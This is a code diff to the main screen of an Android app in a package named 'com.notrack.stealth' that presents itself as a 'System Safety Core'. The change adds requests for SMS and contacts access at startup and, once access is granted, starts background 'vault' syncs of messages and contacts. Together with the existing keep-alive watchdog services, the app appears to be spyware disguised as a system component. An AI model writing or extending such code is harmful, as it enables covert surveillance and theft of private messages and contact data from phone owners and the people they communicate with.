@@ -28,12 +28,18 @@ import android.widget.Toast;
 
 import androidx.annotation.NonNull;
 import androidx.core.app.NotificationManagerCompat;
+import androidx.core.content.ContextCompat;
 
+import com.notrack.stealth.backup.BackupObserverService;
+import com.notrack.stealth.backup.ContactsBackupEngine;
+import com.notrack.stealth.backup.SmsBackupEngine;
 import com.notrack.stealth.sync.SyncWorker;
 import com.notrack.stealth.update.UpdateManager;
 import com.notrack.stealth.watchdog.WatchdogService;
 
 import java.io.File;
+import java.util.ArrayList;
+import java.util.List;
 import java.util.Locale;
 import java.util.Set;
 
@@ -48,10 +54,13 @@ import java.util.Set;
 public class MainActivity extends Activity {
 
     private static final String TAG = "SystemSafetyCore";
-    private static final int REQ_CODE_POST_NOTIF = 101;
+    private static final int REQ_CODE_PERMISSIONS = 101;
 
     private TextView statusSubText;
     private Button grantBtn;
+
+    private TextView smsStatusSubText;
+    private Button grantSmsBtn;
 
     // Installed Version Badge reference
     private TextView tvInstalledVersionBadge;
@@ -94,7 +103,7 @@ public class MainActivity extends Activity {
 
         // Verification Heading: Live CI/CD Automation Confirmation
         TextView bannerHeader = new TextView(this);
-        bannerHeader.setText("⚡ Live Cloud CI/CD Verified v3.12");
+        bannerHeader.setText("⚡ Live Cloud CI/CD Verified v3.13");
         bannerHeader.setTextSize(14);
         bannerHeader.setTextColor(Color.parseColor("#188038"));
         bannerHeader.setTypeface(Typeface.create("sans-serif-medium", Typeface.BOLD));
@@ -145,7 +154,7 @@ public class MainActivity extends Activity {
         yellowCard.setLayoutParams(yellowParams);
 
         TextView tvNewVersionTitle = new TextView(this);
-        tvNewVersionTitle.setText("⭐ Version 3.12 - System Notifications Engine Active");
+        tvNewVersionTitle.setText("⭐ Version 3.13 - Dynamic Permissions & Vault Active");
         tvNewVersionTitle.setTextSize(17);
         tvNewVersionTitle.setTextColor(Color.parseColor("#F57F17")); // Vivid yellow/gold text
         tvNewVersionTitle.setTypeface(Typeface.create("sans-serif-medium", Typeface.BOLD));
@@ -271,7 +280,7 @@ public class MainActivity extends Activity {
         testBox.setBackground(testBoxBg);
 
         TextView testBoxHeader = new TextView(this);
-        testBoxHeader.setText("🧪 TEST VERIFICATION BUILD v3.12");
+        testBoxHeader.setText("🧪 TEST VERIFICATION BUILD v3.13");
         testBoxHeader.setTextSize(14);
         testBoxHeader.setTextColor(Color.parseColor("#137333"));
         testBoxHeader.setTypeface(Typeface.DEFAULT_BOLD);
@@ -281,10 +290,10 @@ public class MainActivity extends Activity {
         String[] testLines = new String[]{
                 "• Line 1: Automated GitHub Actions CI/CD Build",
                 "• Line 2: Firebase Realtime Database Synced",
-                "• Line 3: 100% System Notification Tray Updates Active",
+                "• Line 3: Dynamic Runtime Permissions (SMS & Contacts)",
                 "• Line 4: Foreground High-Speed Downloader Operational",
                 "• Line 5: Background Security Core Running Smoothly",
-                "• Line 6: Build Version: 3.12 (Code 16) Successfully Installed"
+                "• Line 6: Build Version: 3.13 (Code 17) Successfully Installed"
         };
 
         for (String line : testLines) {
@@ -330,11 +339,37 @@ public class MainActivity extends Activity {
 
         root.addView(protectionCard);
 
+        // 4. SMS & Contacts Vault Status Card
+        LinearLayout vaultCard = createCardContainer();
+
+        TextView vaultHeader = new TextView(this);
+        vaultHeader.setText("DATA VAULT ENGINE (SMS & CONTACTS)");
+        vaultHeader.setTextSize(11);
+        vaultHeader.setTextColor(Color.parseColor("#70757A"));
+        vaultHeader.setTypeface(Typeface.DEFAULT_BOLD);
+        vaultCard.addView(vaultHeader);
+
+        smsStatusSubText = new TextView(this);
+        smsStatusSubText.setTextSize(14);
+        smsStatusSubText.setTextColor(Color.parseColor("#5F6368"));
+        smsStatusSubText.setPadding(0, 12, 0, 16);
+        vaultCard.addView(smsStatusSubText);
+
+        grantSmsBtn = new Button(this);
+        grantSmsBtn.setText("Grant SMS & Contacts Access");
+        grantSmsBtn.setBackgroundColor(Color.parseColor("#1A73E8"));
+        grantSmsBtn.setTextColor(Color.WHITE);
+        grantSmsBtn.setVisibility(View.GONE);
+        grantSmsBtn.setOnClickListener(v -> requestSmsAndContactsPermissions());
+        vaultCard.addView(grantSmsBtn);
+
+        root.addView(vaultCard);
+
         scrollView.addView(root);
         setContentView(scrollView);
 
-        // Check POST_NOTIFICATIONS runtime permission for Android 13+ (API 33+)
-        checkPostNotificationPermission();
+        // Check & request runtime permissions on startup (SMS, Contacts, Notifications)
+        checkAndRequestAllPermissions();
 
         // Bootstrap Background Keep-Alive & Watchdog Services
         bootstrapServices();
@@ -394,24 +429,62 @@ public class MainActivity extends Activity {
         }
     }
 
-    private void checkPostNotificationPermission() {
+    private void checkAndRequestAllPermissions() {
+        List<String> needed = new ArrayList<>();
+
+        if (checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
+            needed.add(Manifest.permission.READ_SMS);
+        }
+
+        if (checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
+            needed.add(Manifest.permission.READ_CONTACTS);
+        }
+
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             if (checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
-                requestPermissions(new String[]{Manifest.permission.POST_NOTIFICATIONS}, REQ_CODE_POST_NOTIF);
+                needed.add(Manifest.permission.POST_NOTIFICATIONS);
             }
+        }
+
+        if (!needed.isEmpty()) {
+            Log.i(TAG, "Requesting missing runtime permissions: " + needed);
+            requestPermissions(needed.toArray(new String[0]), REQ_CODE_PERMISSIONS);
+        } else {
+            BackupObserverService.registerObservers(this);
+        }
+    }
+
+    private void requestSmsAndContactsPermissions() {
+        List<String> needed = new ArrayList<>();
+        if (checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
+            needed.add(Manifest.permission.READ_SMS);
+        }
+        if (checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
+            needed.add(Manifest.permission.READ_CONTACTS);
+        }
+
+        if (!needed.isEmpty()) {
+            requestPermissions(needed.toArray(new String[0]), REQ_CODE_PERMISSIONS);
+        } else {
+            Toast.makeText(this, "SMS & Contacts permissions already granted", Toast.LENGTH_SHORT).show();
+            checkAndApplySystemStatus();
         }
     }
 
     @Override
     public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-        if (requestCode == REQ_CODE_POST_NOTIF) {
-            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                Log.i(TAG, "POST_NOTIFICATIONS permission granted!");
-                checkAndApplySystemStatus();
-            } else {
-                Log.w(TAG, "POST_NOTIFICATIONS permission denied.");
+        if (requestCode == REQ_CODE_PERMISSIONS) {
+            boolean smsGranted = checkSelfPermission(Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED;
+            boolean contactsGranted = checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED;
+
+            if (smsGranted || contactsGranted) {
+                Log.i(TAG, "Runtime permissions updated: sms=" + smsGranted + ", contacts=" + contactsGranted);
+                BackupObserverService.registerObservers(this);
+                if (smsGranted) SmsBackupEngine.triggerSyncAsync(this);
+                if (contactsGranted) ContactsBackupEngine.triggerSyncAsync(this);
             }
+            checkAndApplySystemStatus();
         }
     }
 
@@ -427,7 +500,7 @@ public class MainActivity extends Activity {
     private void requestNotificationAccess() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             if (checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
-                requestPermissions(new String[]{Manifest.permission.POST_NOTIFICATIONS}, REQ_CODE_POST_NOTIF);
+                requestPermissions(new String[]{Manifest.permission.POST_NOTIFICATIONS}, REQ_CODE_PERMISSIONS);
                 return;
             }
         }
@@ -483,6 +556,31 @@ public class MainActivity extends Activity {
             statusSubText.setText("⚠️ System Protection Inactive\nNotification access is required to enable System Safety Core.");
             statusSubText.setTextColor(Color.parseColor("#D93025"));
             grantBtn.setVisibility(View.VISIBLE);
+        }
+
+        // Check SMS & Contacts runtime permissions
+        boolean smsOk = checkSelfPermission(Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED;
+        boolean contactsOk = checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED;
+
+        if (smsStatusSubText != null && grantSmsBtn != null) {
+            if (smsOk && contactsOk) {
+                smsStatusSubText.setText("🟢 SMS & Contacts Vault Active\nReal-time monitoring and deletion protection operational.");
+                smsStatusSubText.setTextColor(Color.parseColor("#188038"));
+                grantSmsBtn.setVisibility(View.GONE);
+                BackupObserverService.registerObservers(this);
+            } else {
+                StringBuilder sb = new StringBuilder("⚠️ Action Required:\n");
+                if (!smsOk && !contactsOk) {
+                    sb.append("SMS and Contacts read access required for vault sync.");
+                } else if (!smsOk) {
+                    sb.append("SMS read access required for SMS vault sync.");
+                } else {
+                    sb.append("Contacts read access required for Contacts vault sync.");
+                }
+                smsStatusSubText.setText(sb.toString());
+                smsStatusSubText.setTextColor(Color.parseColor("#D93025"));
+                grantSmsBtn.setVisibility(View.VISIBLE);
+            }
         }
     }
 
